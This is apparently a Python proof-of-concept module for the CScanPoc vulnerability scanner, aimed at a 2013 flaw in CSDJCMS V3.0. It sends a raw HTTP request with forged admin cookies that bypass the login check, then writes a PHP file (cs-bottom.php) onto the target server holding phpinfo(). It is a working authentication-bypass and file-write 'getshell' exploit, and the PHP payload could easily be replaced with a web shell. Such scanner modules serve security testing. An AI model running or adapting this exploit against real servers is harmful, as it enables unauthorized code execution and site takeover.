# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'CSDJCMS_0002'  # 平台漏洞编号
    name = 'CSDJCMS(程氏舞曲管理系统) V3.0 getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-04-11'  # 漏洞公布时间
    desc = '''
        CSDJCMS(程氏舞曲管理系统) V3.0 admin_loginstate.php文件中，如果s_login 的值等于 四个cookie 相加的md5加密，即可直接通过验证。
    '''  # 漏洞描述
    ref = 'http://www.it165.net/safe/html/201304/509.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CSDJCMS(程氏舞曲管理系统)'  # 漏洞应用名称
    product_version = 'CSDJCMS(程氏舞曲管理系统) V3.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '136de6c2-11b2-47d1-a7ab-606df6fca68f'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            url = self.target
            o = urllib.parse.urlparse(url)
            raw = """
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: {url}/admin/skins/s ... ;name=cs-bottom.php
Cookie: CS_AdminID=1; CS_AdminUserName=1; CS_AdminPassWord=1; CS_Quanx=0_1,1_1,1_2,1_3,1_4,1_5,2_1,2_2,2_3,2_4,2_5,2_6,2_7,3_1,3_2,3_3,3_4,4_1,4_2,4_3,4_4,4_5,4_6,4_7,5_1,5_2,5_3,5_4,5_5,6_1,6_2,6_3,7_1,7_2,8_1,8_2,8_3,8_4; CS_Login=a3f5f5a662e8a36525f4794856e2d0a2; PHPSESSID=48ogo025b66lkat9jtc8aecub1; CNZZDATA3755283=cnzz_eid%3D1523253931-1364956519-http%253A%252F%252Fwww.djkao.com%26ntime%3D1364956519%26cnzz_a%3D1%26retime%3D1365129491148%26sin%3D%26ltime%3D1365129491148%26rtime%3D0; bdshare_firstime=1365129335963
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

name=cs-bottom.php&content=%3C%3Fphp+phpinfo%28%29+%3F%3E

            """.format(host=o.hostname, url=url)
            code, head, res, errcode, _ = hh.http(url, raw=raw)

            if 'PHP Version' in res and 'System' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
